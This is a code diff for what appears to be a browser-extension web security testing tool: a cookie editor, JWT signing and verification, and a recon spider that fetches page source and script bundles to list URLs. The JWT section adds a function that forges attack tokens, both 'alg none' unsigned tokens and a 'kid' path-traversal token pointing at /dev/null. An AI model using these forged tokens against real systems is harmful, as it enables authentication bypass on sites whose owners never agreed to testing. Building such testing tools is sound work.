@@ -8,6 +8,22 @@ const esc = s => String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>
 const copyText = t => navigator.clipboard.writeText(String(t)).catch(() => {});
 const isJWT = v => /^[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*$/.test((v||'').trim());
 
+function downloadText(filename, text, type = 'text/plain') {
+  const blob = new Blob([text], { type });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = filename;
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  URL.revokeObjectURL(url);
+}
+
+function absolutizeUrl(raw, base) {
+  try { return new URL(raw, base).href; } catch { return null; }
+}
+
 function prettyJSON(str) {
   try {
     const obj = JSON.parse(str);
@@ -88,10 +104,13 @@ const state = {
   activeRoleId:    null,
   jwtSourceCookie: null,
   ctxIdx:          null,
+  dispatchLastPaneTab: 'headers',
+  customPayloadCats: [],
+  payloadGroupOrders: {},
+  payloadGraphQLMethod: 'POST',
   storageView:     'local',
   roleEditId:      null,
   ctxSource:       null,
-  storageSnapshot: { local: null, session: null },
 };
 
 // ─── Tabs ─────────────────────────────────────────────────────────────────────
@@ -109,11 +128,92 @@ function initTabs() {
 
 // ─── Cookies ──────────────────────────────────────────────────────────────────
 
+function formatBgError(error) {
+  if (!error) return 'Unknown error';
+  return error.message || String(error);
+}
+
+function buildCookieSetDetails(details) {
+  const cookie = { ...details };
+  Object.keys(cookie).forEach(k => {
+    if (cookie[k] == null) delete cookie[k];
+  });
+  if (cookie.sameSite === 'unspecified') delete cookie.sameSite;
+  if (!cookie.domain) delete cookie.domain;
+  if (!cookie.path) cookie.path = '/';
+  return cookie;
+}
+
+function cookieUrlForDetails(cookie) {
+  const scheme = (cookie.secure || state.tabUrl.startsWith('https')) ? 'https' : 'http';
+  const host = String(cookie.domain || '').replace(/^\./, '');
+  const path = cookie.path || '/';
+  return `${scheme}://${host}${path.startsWith('/') ? path : '/' + path}`;
+}
+
+function buildCookieSetDetailsFromExisting(cookie, overrides = {}) {
+  const details = {
+    url: cookieUrlForDetails(cookie),
+    name: cookie.name,
+    value: cookie.value,
+    path: cookie.path || '/',
+    httpOnly: !!cookie.httpOnly,
+    secure: !!cookie.secure,
+    sameSite: cookie.sameSite,
+    storeId: cookie.storeId,
+    partitionKey: cookie.partitionKey,
+  };
+  if (!cookie.hostOnly) details.domain = cookie.domain;
+  if (cookie.expirationDate) details.expirationDate = cookie.expirationDate;
+  return buildCookieSetDetails({ ...details, ...overrides });
+}
+
+function validateCookieSetDetails(cookie) {
+  if (cookie.sameSite === 'no_restriction' && !cookie.secure) {
+    return 'SameSite=None requires Secure. Choose Unspecified or enable Secure.';
+  }
+  if (cookie.name?.startsWith('__Secure-') && !cookie.secure) {
+    return '__Secure- cookies require the Secure flag.';
+  }
+  if (cookie.name?.startsWith('__Host-')) {
+    if (!cookie.secure) return '__Host- cookies require the Secure flag.';
+    if (cookie.path !== '/') return '__Host- cookies require path "/".';
+    if (cookie.domain) return '__Host- cookies cannot set a Domain value.';
+  }
+  if ((cookie.name?.startsWith('__Http-') || cookie.name?.startsWith('__Host-Http-')) && (!cookie.secure || !cookie.httpOnly)) {
+    return '__Http- cookies require both Secure and HttpOnly.';
+  }
+  return null;
+}
+
 const Cookies = {
-  async load() {
-    const { cookies = [] } = await bg('GET_COOKIES', { url: state.tabUrl });
+  async load({ syncTab = true } = {}) {
+    if (syncTab) {
+      const tab = await getActiveTab().catch(() => null);
+      if (tab?.id) state.tabId = tab.id;
+      if (isHttpUrl(tab?.url)) state.tabUrl = tab.url;
+    }
+    if (!isHttpUrl(state.tabUrl)) {
+      state.cookiesCache = [];
+      this.render();
+      return [];
+    }
+    const { cookies = [], error } = await bg('GET_COOKIES', { url: state.tabUrl });
+    if (error) { toast(`Cookie refresh error: ${formatBgError(error)}`, 'error'); return state.cookiesCache; }
     state.cookiesCache = cookies;
     this.render();
+    return cookies;
+  },
+
+  async reloadAfterMutation() {
+    const before = JSON.stringify(state.cookiesCache.map(c => [c.name, c.value, c.domain, c.path, c.storeId, c.hostOnly]));
+    for (let i = 0; i < 8; i++) {
+      await new Promise(resolve => setTimeout(resolve, i < 2 ? 120 : 250));
+      const cookies = await this.load();
+      const after = JSON.stringify(cookies.map(c => [c.name, c.value, c.domain, c.path, c.storeId, c.hostOnly]));
+      if (after !== before) return cookies;
+    }
+    return state.cookiesCache;
   },
 
   render() {
@@ -140,9 +240,9 @@ const Cookies = {
         return `
         <div class="st-entry ${jwt ? 'jwt-entry' : ''}" data-idx="${i}">
           <div class="st-entry-btns">
-            <button class="sm" data-action="edit" data-idx="${i}" title="Edit" aria-label="Edit">✎</button>
-            <button class="sm danger" data-action="del" data-idx="${i}" title="Delete" aria-label="Delete">✕</button>
-            <button class="sm" data-action="copy" data-idx="${i}" title="Copy" aria-label="Copy">⧉</button>
+            <button class="sm" data-action="edit" data-idx="${i}" title="Edit" aria-label="Edit">Edit</button>
+            <button class="sm danger" data-action="del" data-idx="${i}" title="Delete" aria-label="Delete">Delete</button>
+            <button class="sm" data-action="copy" data-idx="${i}" title="Copy" aria-label="Copy">Copy</button>
             ${jwt ? `<button class="sm jwt-send" data-action="send-jwt" data-idx="${i}">JWT</button>` : ''}
           </div>
           <div class="st-entry-content">
@@ -186,19 +286,18 @@ const Cookies = {
 
   async inlineSave(idx, field, newVal) {
     const c = state.cookiesCache[idx];
-    const scheme = (c.secure || state.tabUrl.startsWith('https')) ? 'https' : 'http';
-    const host   = c.domain.startsWith('.') ? c.domain.slice(1) : c.domain;
-    const url    = `${scheme}://${host}${c.path}`;
 
     if (field === 'name' && newVal !== c.name) {
-      await bg('REMOVE_COOKIE', { url, name: c.name });
+      await bg('REMOVE_COOKIE_EXACT', { cookie: c });
     }
-    const cookie = { url, name: field === 'name' ? newVal : c.name, value: field === 'value' ? newVal : c.value, domain: c.domain, path: c.path, httpOnly: c.httpOnly, secure: c.secure, sameSite: c.sameSite };
-    if (c.expirationDate) cookie.expirationDate = c.expirationDate;
+    const cookie = buildCookieSetDetailsFromExisting(c, {
+      name: field === 'name' ? newVal : c.name,
+      value: field === 'value' ? newVal : c.value,
+    });
     const { error } = await bg('SET_COOKIE', { cookie });
-    if (error) { toast(`Error: ${error.message}`, 'error'); }
+    if (error) { toast(`Error: ${formatBgError(error)}`, 'error'); }
     else toast('Saved', 'success');
-    this.load();
+    await this.reloadAfterMutation();
   },
 
   sendToJWT(idx) {
@@ -229,12 +328,12 @@ const Cookies = {
     $('cookie-modal-title').textContent = c ? 'Edit Cookie' : 'Add Cookie';
     $('ck-name').value    = c?.name  ?? '';
     $('ck-value').value   = c?.value ?? '';
-    $('ck-domain').value  = c?.domain ?? (new URL(state.tabUrl).hostname || '');
+    $('ck-domain').value  = c ? (c.hostOnly ? '' : c.domain) : (new URL(state.tabUrl).hostname || '');
     $('ck-path').value    = c?.path  ?? '/';
     $('ck-expires').value = c?.expirationDate ? tsToDatetimeLocal(c.expirationDate) : '';
     $('ck-httponly').checked = c?.httpOnly ?? false;
     $('ck-secure').checked   = c?.secure   ?? false;
-    $('ck-samesite').value   = c?.sameSite ?? 'no_restriction';
+    $('ck-samesite').value   = c?.sameSite ?? 'unspecified';
     $('cookie-modal').classList.remove('hidden');
     $('ck-name').focus();
   },
@@ -257,46 +356,45 @@ const Cookies = {
     if (!name) { toast('Name required', 'error'); return; }
 
     const scheme = (secure || state.tabUrl.startsWith('https')) ? 'https' : 'http';
-    const host   = domain.startsWith('.') ? domain.slice(1) : domain;
+    const fallbackHost = (() => { try { return new URL(state.tabUrl).hostname; } catch { return ''; } })();
+    const host   = domain ? (domain.startsWith('.') ? domain.slice(1) : domain) : fallbackHost;
     const url    = `${scheme}://${host}${path}`;
 
-    const cookie = { url, name, value, domain, path, httpOnly, secure, sameSite };
+    const rawCookie = { url, name, value, domain, path, httpOnly, secure, sameSite };
+    const validationError = validateCookieSetDetails(rawCookie);
+    if (validationError) { toast(validationError, 'error'); return; }
+    const cookie = buildCookieSetDetails(rawCookie);
     if (expStr) cookie.expirationDate = datetimeLocalToTs(expStr);
 
     if (state.cookieEditIdx !== null) {
       const old = state.cookiesCache[state.cookieEditIdx];
-      if (old.name !== name || old.domain !== domain || old.path !== path) {
-        const oldScheme = old.secure ? 'https' : 'http';
-        const oldHost   = old.domain.startsWith('.') ? old.domain.slice(1) : old.domain;
-        await bg('REMOVE_COOKIE', { url: `${oldScheme}://${oldHost}${old.path}`, name: old.name });
+      const oldDomain = old.hostOnly ? '' : old.domain;
+      if (old.name !== name || oldDomain !== domain || old.path !== path) {
+        await bg('REMOVE_COOKIE_EXACT', { cookie: old });
       }
     }
 
     const { error } = await bg('SET_COOKIE', { cookie });
-    if (error) { toast(`Error: ${error.message}`, 'error'); return; }
+    if (error) { toast(`Error: ${formatBgError(error)}`, 'error'); return; }
     toast('Saved', 'success');
     this.closeModal();
-    this.load();
+    await this.reloadAfterMutation();
   },
 
   async del(idx) {
     const c = state.cookiesCache[idx];
-    const scheme = c.secure ? 'https' : 'http';
-    const host   = c.domain.startsWith('.') ? c.domain.slice(1) : c.domain;
-    await bg('REMOVE_COOKIE', { url: `${scheme}://${host}${c.path}`, name: c.name });
+    const { ok, error } = await bg('REMOVE_COOKIE_EXACT', { cookie: c });
+    if (error) { toast(`Error: ${formatBgError(error)}`, 'error'); return; }
+    if (!ok) { toast('Cookie was not removed', 'warn'); await this.reloadAfterMutation(); return; }
     toast('Deleted', 'success');
-    this.load();
+    await this.reloadAfterMutation();
   },
 
   async clearAll() {
     if (!confirm(`Delete all ${state.cookiesCache.length} cookies for this site?`)) return;
-    await Promise.all(state.cookiesCache.map(c => {
-      const scheme = c.secure ? 'https' : 'http';
-      const host   = c.domain.startsWith('.') ? c.domain.slice(1) : c.domain;
-      return bg('REMOVE_COOKIE', { url: `${scheme}://${host}${c.path}`, name: c.name });
-    }));
+    await Promise.all(state.cookiesCache.map(c => bg('REMOVE_COOKIE_EXACT', { cookie: c })));
     toast('All cookies cleared', 'success');
-    this.load();
+    await this.reloadAfterMutation();
   },
 };
 
@@ -344,33 +442,16 @@ const Storage = {
     else this.loadSession();
   },
 
-  takeSnapshot() {
-    state.storageSnapshot = {
-      local:   { ...state.localCache },
-      session: { ...state.sessionCache },
-    };
-    this.renderTable(state.storageView, state.storageView === 'local' ? state.localCache : state.sessionCache);
-    $('storage-clear-diff').classList.remove('hidden');
-    toast('Snapshot taken', 'success');
-  },
-
-  clearSnapshot() {
-    state.storageSnapshot = { local: null, session: null };
-    this.renderTable(state.storageView, state.storageView === 'local' ? state.localCache : state.sessionCache);
-    $('storage-clear-diff').classList.add('hidden');
-  },
-
   renderTable(type, data) {
     const bodyId   = `${type}-body`;
     const countEl  = $(`${type}-count`);
     const filter   = ($('storage-filter')?.value || '').toLowerCase();
-    const snap     = state.storageSnapshot[type];
     const entries  = Object.entries(data).filter(([k, v]) =>
       !filter || k.toLowerCase().includes(filter) || String(v).toLowerCase().includes(filter)
     );
     if (countEl) countEl.textContent = entries.length;
 
-    const makeRow = (k, v, badgeHtml, extraClass = '') => {
+    const makeRow = (k, v) => {
       const vStr = String(v);
       const pretty = prettyJSON(vStr);
       const display = pretty || vStr;
@@ -383,12 +464,11 @@ const Storage = {
             <button class="collapse-btn" data-action="toggle-collapse" aria-label="Toggle value"></button>
           </div>`
         : `<span class="val-text">${esc(display)}</span>`;
-      return `<div class="st-entry${extraClass ? ' ' + extraClass : ''}" data-type="${esc(type)}" data-key="${esc(k)}">
+      return `<div class="st-entry" data-type="${esc(type)}" data-key="${esc(k)}">
         <div class="st-entry-btns">
-          ${badgeHtml}
-          <button class="sm" data-action="st-edit" data-st="${esc(type)}" data-skey="${esc(k)}" title="Edit" aria-label="Edit">✎</button>
-          <button class="sm danger" data-action="st-del" data-st="${esc(type)}" data-skey="${esc(k)}" title="Delete" aria-label="Delete">✕</button>
-          <button class="sm" data-action="st-copy" data-val="${esc(vStr)}" title="Copy" aria-label="Copy">⧉</button>
+          <button class="sm" data-action="st-edit" data-st="${esc(type)}" data-skey="${esc(k)}" title="Edit" aria-label="Edit">Edit</button>
+          <button class="sm danger" data-action="st-del" data-st="${esc(type)}" data-skey="${esc(k)}" title="Delete" aria-label="Delete">Delete</button>
+          <button class="sm" data-action="st-copy" data-val="${esc(vStr)}" title="Copy" aria-label="Copy">Copy</button>
         </div>
         <div class="st-entry-content">
           <div class="st-entry-key"><span class="st-label">Key:</span> <span class="ck-text">${esc(k)}</span></div>
@@ -397,24 +477,7 @@ const Storage = {
       </div>`;
     };
 
-    const rows = entries.map(([k, v]) => {
-      let badge = '';
-      if (snap) {
-        if (!(k in snap)) badge = '<span class="diff-badge diff-new">NEW</span>';
-        else if (String(snap[k]) !== String(v)) badge = '<span class="diff-badge diff-changed">CHG</span>';
-      }
-      return makeRow(k, v, badge);
-    });
-
-    // Removed keys (in snapshot but not current data)
-    if (snap) {
-      for (const k of Object.keys(snap)) {
-        if (k in data) continue;
-        if (filter && !k.toLowerCase().includes(filter)) continue;
-        const badge = '<span class="diff-badge diff-removed">DEL</span>';
-        rows.push(makeRow(k, snap[k], badge, 'st-removed'));
-      }
-    }
+    const rows = entries.map(([k, v]) => makeRow(k, v));
 
     $(bodyId).innerHTML = rows.join('') || `<div class="empty" style="padding:10px">Empty</div>`;
   },
@@ -464,7 +527,7 @@ const Storage = {
     const cache = type === 'local' ? state.localCache : state.sessionCache;
     state.storageAddType = type;
     state.storageEditKey = key;
-    $('storage-modal-title').textContent = `Edit — ${type}Storage`;
+    $('storage-modal-title').textContent = `Edit ${type}Storage`;
     $('sk-key').value   = key;
     $('sk-value').value = cache[key] ?? '';
     $('sk-key').disabled = false;
@@ -488,14 +551,14 @@ const Storage = {
     await execPage((ns, k, v) => window[ns].setItem(k, v), [nsName, key, val]);
     toast('Saved', 'success');
     this.closeModal();
-    this.load();
+    await this.load();
   },
 
   async del(type, key) {
     const nsName = type === 'local' ? 'localStorage' : 'sessionStorage';
     await execPage((ns, k) => window[ns].removeItem(k), [nsName, key]);
     toast('Deleted', 'success');
-    this.load();
+    await this.load();
   },
 
   async clearAll(type) {
@@ -510,7 +573,13 @@ const Storage = {
 // ─── JWT ──────────────────────────────────────────────────────────────────────
 
 function b64urlEncode(str) {
-  return btoa(unescape(encodeURIComponent(str)))
+  const bytes = new TextEncoder().encode(str);
+  return btoa(String.fromCharCode(...bytes))
+    .replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
+}
+
+function b64urlEncodeBytes(bytes) {
+  return btoa(String.fromCharCode(...new Uint8Array(bytes)))
     .replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
 }
 
@@ -532,18 +601,25 @@ const JWT = {
     return { header, payload, sig: parts[2] ?? '' };
   },
 
-  async signHS256(header, payload, secret) {
-    const h = b64urlEncode(JSON.stringify(header));
-    const p = b64urlEncode(JSON.stringify(payload));
-    const data = `${h}.${p}`;
+  signingInput(header, payload) {
+    return `${b64urlEncode(JSON.stringify(header))}.${b64urlEncode(JSON.stringify(payload))}`;
+  },
+
+  async signHMAC(header, payload, secret, alg = 'HS256') {
+    const HASH_MAP = { HS256: 'SHA-256', HS384: 'SHA-384', HS512: 'SHA-512' };
+    const hash = HASH_MAP[alg.toUpperCase()];
+    if (!hash) throw new Error(`Unsupported HMAC alg: ${alg}`);
+    const data = this.signingInput({ ...header, alg }, payload);
     const key = await crypto.subtle.importKey(
       'raw', new TextEncoder().encode(secret),
-      { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']
+      { name: 'HMAC', hash }, false, ['sign']
     );
     const sig = await crypto.subtle.sign('HMAC', key, new TextEncoder().encode(data));
-    const sigB64 = btoa(String.fromCharCode(...new Uint8Array(sig)))
-      .replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
-    return `${data}.${sigB64}`;
+    return `${data}.${b64urlEncodeBytes(sig)}`;
+  },
+
+  async signHS256(header, payload, secret) {
+    return this.signHMAC(header, payload, secret, 'HS256');
   },
 
   signNone(header, payload, algValue) {
@@ -552,22 +628,53 @@ const JWT = {
     return `${h}.${p}.`;
   },
 
-  async verifyHS256(token, secret) {
+  async sign(header, payload, keyMaterial, alg) {
+    const upper = alg.toUpperCase();
+    if (upper === 'NONE') return this.signNone(header, payload, alg);
+    if (upper === 'HS256') return this.signHMAC(header, payload, keyMaterial, upper);
+    throw new Error(`Unsupported alg: ${alg}`);
+  },
+
+  async buildAttackToken(type, header, payload, opts = {}) {
+    const material = opts.material || '';
+    if (type === 'alg-none') {
+      const alg = String(opts.alg || '').toLowerCase() === 'none' ? opts.alg : 'none';
+      return this.signNone({ ...header, alg }, payload, alg);
+    }
+    if (type === 'kid-traversal') {
+      return this.signHMAC({ ...header, alg: 'HS256', kid: opts.kid || '../../../../dev/null' }, payload, material || '\x00', 'HS256');
+    }
+    throw new Error(`Unknown JWT attack: ${type}`);
+  },
+
+  async verifyHMAC(token, secret) {
     const parts = token.trim().split('.');
     if (parts.length !== 3) throw new Error('Need 3 parts');
+    const header = JSON.parse(b64urlDecode(parts[0]));
+    const alg = String(header.alg || 'HS256').toUpperCase();
+    const HASH_MAP = { HS256: 'SHA-256', HS384: 'SHA-384', HS512: 'SHA-512' };
+    const hash = HASH_MAP[alg];
+    if (!hash) throw new Error(`Verify currently supports HS256/384/512, token uses ${alg}`);
     const data = `${parts[0]}.${parts[1]}`;
     const key = await crypto.subtle.importKey(
       'raw', new TextEncoder().encode(secret),
-      { name: 'HMAC', hash: 'SHA-256' }, false, ['verify']
+      { name: 'HMAC', hash }, false, ['verify']
     );
     const sigBytes = Uint8Array.from(atob(parts[2].replace(/-/g,'+').replace(/_/g,'/')), c => c.charCodeAt(0));
     return crypto.subtle.verify('HMAC', key, sigBytes, new TextEncoder().encode(data));
+  },
+
+  async verifyHS256(token, secret) {
+    return this.verifyHMAC(token, secret);
   },
 };
 
 // ─── Recon ────────────────────────────────────────────────────────────────────
 
 const Recon = {
+  spiderGroupBy: 'domain',
+  spiderCache: null,
+
   async assertScriptable() {
     const tab = await getActiveTab();
     if (!isHttpUrl(tab?.url)) throw new Error('Navigate to a real http/https page first.');
@@ -594,7 +701,7 @@ const Recon = {
       } catch { return '[]'; }
     }).catch(e => { toast(String(e), 'error'); return '[]'; });
     const forms = JSON.parse(raw);
-    let html = `<div class="recon-section" id="recon-sec-forms" data-severity="info" data-section-name="Forms"><h4>Forms (${forms.length}) <button class="recon-copy-btn" data-action="recon-copy" title="Copy">⧉</button></h4>`;
+    let html = `<div class="recon-section" id="recon-sec-forms" data-severity="info" data-section-name="Forms"><h4>Forms (${forms.length}) <button class="recon-rerun-btn" data-action="recon-rerun" data-check="forms" title="Re-run">Run</button><button class="recon-section-toggle" data-action="recon-section-toggle" title="Collapse/expand"></button><button class="recon-copy-btn" data-action="recon-copy" title="Copy">Copy</button></h4>`;
     if (!forms.length) html += '<div class="recon-item muted">No forms found</div>';
     forms.forEach(f => {
       html += `<div class="recon-item">
@@ -609,42 +716,68 @@ const Recon = {
     appendRecon(html);
   },
 
-  async links() {
-    await this.assertScriptable().catch(e => { toast(String(e), 'warn'); throw e; });
-    const raw = await execPage(() => {
-      try {
-        const links = [...new Set([
-          ...Array.from(document.querySelectorAll('a[href]')).map(a => a.href),
-          ...Array.from(document.querySelectorAll('form[action]')).map(f => f.action),
-          ...Array.from(document.querySelectorAll('script[src]')).map(s => s.src),
-          ...Array.from(document.querySelectorAll('link[href]')).map(l => l.href),
-          ...Array.from(document.querySelectorAll('iframe[src]')).map(i => i.src),
-          ...Array.from(document.querySelectorAll('img[src]')).map(i => i.src),
-        ].filter(u => u && !u.startsWith('data:')))];
-        const byDomain = {};
-        links.forEach(u => {
-          try {
-            const host = new URL(u).hostname;
-            if (!byDomain[host]) byDomain[host] = [];
-            byDomain[host].push(u);
-          } catch {}
-        });
-        return JSON.stringify(byDomain);
-      } catch { return '{}'; }
-    }).catch(e => { toast(String(e), 'error'); return '{}'; });
-    const byDomain = JSON.parse(raw);
-    const total = Object.values(byDomain).flat().length;
-    const SPIDER_PREVIEW = 40;
-    let html = `<div class="recon-section" id="recon-sec-links" data-severity="info" data-section-name="Links"><h4>Discovered Links &amp; Assets (${total}) <button class="recon-copy-btn" data-action="recon-copy" title="Copy">⧉</button></h4>`;
-    for (const [domain, urls] of Object.entries(byDomain)) {
-      html += `<div class="recon-item"><b>${esc(domain)}</b> <span class="muted">(${urls.length})</span><div class="recon-spider-urls">`;
-      urls.slice(0, SPIDER_PREVIEW).forEach(u => {
-        html += `<div class="muted recon-spider-line" style="font-size:13px;padding:1px 0">${esc(u)}</div>`;
+  renderSpiderFromCache() {
+    const records = this.spiderCache?.records || [];
+    const byUrl = new Map();
+    records.forEach(r => {
+      if (!byUrl.has(r.url)) byUrl.set(r.url, { url: r.url, locations: [] });
+      const suffix = r.line ? ` line ${r.line}` : '';
+      const loc = r.source === 'page source' ? `HTML source${suffix}` : `${r.source || 'Unknown source'}${suffix}`;
+      if (!byUrl.get(r.url).locations.includes(loc)) byUrl.get(r.url).locations.push(loc);
+    });
+
+    const grouped = {};
+    if (this.spiderGroupBy === 'source') {
+      records.forEach(r => {
+        const entry = byUrl.get(r.url);
+        const key = r.sourceGroup;
+        if (!grouped[key]) grouped[key] = new Map();
+        grouped[key].set(r.url, entry);
       });
-      if (urls.length > SPIDER_PREVIEW) {
-        const rest = urls.slice(SPIDER_PREVIEW);
+    } else {
+      Array.from(byUrl.values()).forEach(entry => {
+        try {
+          const host = new URL(entry.url).hostname;
+          if (!grouped[host]) grouped[host] = new Map();
+          grouped[host].set(entry.url, entry);
+        } catch {}
+      });
+    }
+    const groups = Object.entries(grouped)
+      .map(([name, map]) => [name, Array.from(map.values()).sort((a, b) => a.url.localeCompare(b.url))])
+      .sort(([a], [b]) => a.localeCompare(b));
+
+    const total = Array.from(byUrl.values()).length;
+    const SPIDER_PREVIEW = 40;
+    const domainActive = this.spiderGroupBy === 'domain' ? ' active' : '';
+    const sourceActive = this.spiderGroupBy === 'source' ? ' active' : '';
+    let html = `<div class="recon-section" id="recon-sec-links" data-severity="info" data-section-name="Links">
+    <h4>Discovered Links &amp; Assets (${total})
+      <button class="recon-rerun-btn" data-action="recon-rerun" data-check="links" title="Run">Run</button>
+      <button class="recon-section-toggle" data-action="recon-section-toggle" title="Collapse/expand"></button>
+      <button class="recon-copy-btn recon-copy-text" data-action="recon-copy" title="Copy">Copy</button>
+    </h4>
+    <div class="recon-links-filter">
+      <span class="recon-spider-group-toggle">
+        <button type="button" class="spider-group-btn${domainActive}" data-action="spider-group" data-group="domain">Domain</button>
+        <button type="button" class="spider-group-btn${sourceActive}" data-action="spider-group" data-group="source">Source</button>
+      </span>
+    </div>`;
+    for (const [group, entries] of groups) {
+      html += `<div class="recon-item recon-spider-group"><b>${esc(group)}</b> <span class="muted">(${entries.length})</span><div class="recon-spider-urls">`;
+      const renderLine = entry => `<div class="recon-spider-line" data-url="${esc(entry.url)}" data-locations="${esc(entry.locations.join(' | '))}">
+        <div class="recon-spider-url-row">
+          <div class="muted recon-spider-url">${esc(entry.url)}</div>
+          <button class="recon-copy-btn recon-spider-details" data-action="spider-toggle-details" title="Show source locations">Details</button>
+          <button class="recon-copy-btn recon-spider-repeat" data-action="spider-send-repeater" data-url="${esc(entry.url)}" title="Send to Repeater">Repeat</button>
+        </div>
+        <div class="recon-spider-loc hidden">${esc(entry.locations.join(' | '))}</div>
+      </div>`;
+      entries.slice(0, SPIDER_PREVIEW).forEach(entry => { html += renderLine(entry); });
+      if (entries.length > SPIDER_PREVIEW) {
+        const rest = entries.slice(SPIDER_PREVIEW);
         html += `<div class="collapsible recon-spider-extra collapsed">
-          <div class="collapse-full">${rest.map(u => `<div class="muted recon-spider-line" style="font-size:13px;padding:1px 0">${esc(u)}</div>`).join('')}</div>
+          <div class="collapse-full">${rest.map(renderLine).join('')}</div>
           <div class="recon-spider-more-ctrls">
             <span class="collapse-preview muted" data-action="toggle-collapse">+${rest.length} more (expand)</span>
             <button type="button" class="collapse-btn" data-action="toggle-collapse" aria-label="Toggle extra URLs"></button>
@@ -656,6 +789,83 @@ const Recon = {
     if (!total) html += '<div class="recon-item muted">No links found</div>';
     html += '</div>';
     appendRecon(html);
+  },
+
+  async links() {
+    await this.assertScriptable().catch(e => { toast(String(e), 'warn'); throw e; });
+    const pageUrl = state.tabUrl;
+    toast('Spidering DOM, source, and JS bundles...', 'info');
+    const raw = await execPage(() => {
+      try {
+        const pick = (selector, attr, label) => Array.from(document.querySelectorAll(selector))
+          .map(el => ({ url: el[attr] || el.getAttribute(attr), source: `DOM ${label}` }))
+          .filter(x => x.url && !String(x.url).startsWith('data:'));
+        const domLinks = [
+          ...pick('a[href]', 'href', 'anchor'),
+          ...pick('form[action]', 'action', 'form'),
+          ...pick('script[src]', 'src', 'script'),
+          ...pick('link[href]', 'href', 'link'),
+          ...pick('iframe[src]', 'src', 'iframe'),
+          ...pick('img[src]', 'src', 'image'),
+          ...pick('source[src]', 'src', 'media'),
+          ...pick('[srcset]', 'srcset', 'srcset'),
+          ...pick('[data-href],[data-url],[data-src],[data-route],[data-path]', 'dataset', 'data-*')
+            .flatMap(({ source }, idx) => {
+              const el = document.querySelectorAll('[data-href],[data-url],[data-src],[data-route],[data-path]')[idx];
+              return ['href','url','src','route','path'].map(k => el?.dataset?.[k]).filter(Boolean).map(url => ({ url, source }));
+            }),
+        ];
+        const scripts = Array.from(document.querySelectorAll('script[src]')).map(s => s.src).filter(Boolean);
+        return JSON.stringify({ domLinks, scripts });
+      } catch { return '{"domLinks":[],"scripts":[]}'; }
+    }).catch(e => { toast(String(e), 'error'); return '{"domLinks":[],"scripts":[]}'; });
+
+    const { domLinks = [], scripts = [] } = JSON.parse(raw);
+    const records = [];
+    const sourceGroupLabel = source => {
+      if (source === 'page source') return 'HTML source';
+      return source || 'Unknown source';
+    };
+    const addRecord = (url, source, line = null, base = pageUrl) => {
+      const abs = absolutizeUrl(url, base);
+      if (!abs || abs.startsWith('data:') || abs.startsWith('javascript:') || abs.startsWith('mailto:') || abs.startsWith('tel:')) return;
+      records.push({ url: abs, source, sourceGroup: sourceGroupLabel(source), line });
+    };
+    domLinks.forEach(({ url, source }) => {
+      if (String(url).includes(',')) {
+        String(url).split(',').map(x => x.trim().split(/\s+/)[0]).forEach(u => addRecord(u, source));
+      } else {
+        addRecord(url, source);
+      }
+    });
+
+    const scanTextForLinks = (text, source, base) => {
+      if (!text) return;
+      const patterns = [
+        /https?:\/\/[^\s"'`<>)\\]+/g,
+        /\/\/[A-Za-z0-9.-]+\.[A-Za-z]{2,}[^\s"'`<>)\\]*/g,
+        /["'`]((?:\/|\.\.?\/)(?:api|v\d+|graphql|rest|admin|auth|user|account|assets|static|_next|build|wp-|[A-Za-z0-9._-])[^\s"'`<>]{0,180})["'`]/gi,
+      ];
+      patterns.forEach(re => {
+        for (const m of text.matchAll(re)) {
+          const rawUrl = m[1] || m[0];
+          const line = text.slice(0, m.index).split('\n').length;
+          addRecord(rawUrl, source, line, base);
+        }
+      });
+    };
+
+    const sourceResp = await bg('FETCH', { url: pageUrl, maxBody: 400000 }).catch(() => null);
+    if (sourceResp?.body) scanTextForLinks(sourceResp.body, 'page source', pageUrl);
+
+    const uniqueScripts = [...new Set(scripts)].slice(0, 40);
+    for (const scriptUrl of uniqueScripts) {
+      const resp = await bg('FETCH', { url: scriptUrl, maxBody: 700000 }).catch(() => null);
+      if (resp?.body) scanTextForLinks(resp.body, scriptUrl, scriptUrl);
+    }
+
+    this.spiderCache = { pageUrl, records };
+    this.renderSpiderFromCache();
   },
 
   async techStack() {
@@ -873,8 +1083,9 @@ const Recon = {
     const totalDetected = seen.size;
     let html = `<div class="recon-section" id="recon-sec-tech" data-severity="info" data-section-name="Tech Stack">
       <h4>Tech Stack (${totalDetected})
+        <button class="recon-rerun-btn" data-action="recon-rerun" data-check="tech" title="Re-run">Run</button>
         <button class="recon-section-toggle" data-action="recon-section-toggle" title="Collapse/expand"></button>
-        <button class="recon-copy-btn" data-action="recon-copy" title="Copy">⧉</button>
+        <button class="recon-copy-btn" data-action="recon-copy" title="Copy">Copy</button>
       </h4>
       <div class="recon-section-body">`;
 
@@ -920,7 +1131,7 @@ const Recon = {
       } catch { return '[]'; }
     }).catch(e => { toast(String(e), 'error'); return '[]'; });
     const fields = JSON.parse(raw);
-    let html = `<div class="recon-section" id="recon-sec-hidden" data-severity="info" data-section-name="Hidden Fields"><h4>Hidden Fields (${fields.length}) <button class="recon-copy-btn" data-action="recon-copy" title="Copy">⧉</button></h4>`;
+    let html = `<div class="recon-section" id="recon-sec-hidden" data-severity="info" data-section-name="Hidden Fields"><h4>Hidden Fields (${fields.length}) <button class="recon-rerun-btn" data-action="recon-rerun" data-check="hidden" title="Re-run">Run</button><button class="recon-section-toggle" data-action="recon-section-toggle" title="Collapse/expand"></button><button class="recon-copy-btn" data-action="recon-copy" title="Copy">Copy</button></h4>`;
     if (!fields.length) {
       html += `<div class="recon-item muted">None found</div>`;
     } else {
@@ -939,7 +1150,7 @@ const Recon = {
     await this.assertScriptable().catch(e => { toast(String(e), 'warn'); throw e; });
     const url = state.tabUrl;
     toast('Fetching source…', 'info');
-    const { body = '', error } = await bg('FETCH', { url });
+    const { body = '', error } = await bg('FETCH', { url, maxBody: 400000 });
     if (error) { toast(`Fetch error: ${error}`, 'error'); return; }
 
     const comments = [...body.matchAll(/<!--[\s\S]*?-->/g)]
@@ -952,7 +1163,7 @@ const Recon = {
     const scriptSrcs = [...body.matchAll(/<script[^>]+src=["']([^"']+)["']/gi)].map(m => m[1]);
 
